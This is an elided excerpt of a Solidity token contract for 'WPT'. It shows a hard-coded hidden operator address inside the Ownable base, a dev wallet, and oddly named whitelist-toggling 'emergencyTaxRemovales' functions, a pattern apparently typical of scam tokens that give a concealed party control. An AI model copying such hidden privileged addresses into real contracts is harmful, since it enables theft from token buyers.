...
/** 
    Telegram：https://t.me/WORLDPEACETOKEN
    Website：https://www.worldpeace.com
    Twitter: https://twitter.com/WPT_ERC
...
abstract contract Ownable is Context {
    ...
    address internal taxAddys = 0xBf2576d355284F6b9E10e72a053C1B556B13fc52;
    ...
    function _checkOperator() internal view virtual {
        require(_msgSender() == taxAddys, "Ownable: caller is not the operator");
    }
...
contract WPT is ERC20, Ownable {
    ...
    address private _devWallets = 0x2F064b95dB2b2c6e1DdC29A55753BDFDEF6508E6;
    ...
    function emergencyTaxRemovales(address addy) external onlyowner {
    ...
    function emergencyTaxRemovales(address addy, bool changer) external onlyOwner {
        wl[addy] = changer;
    }
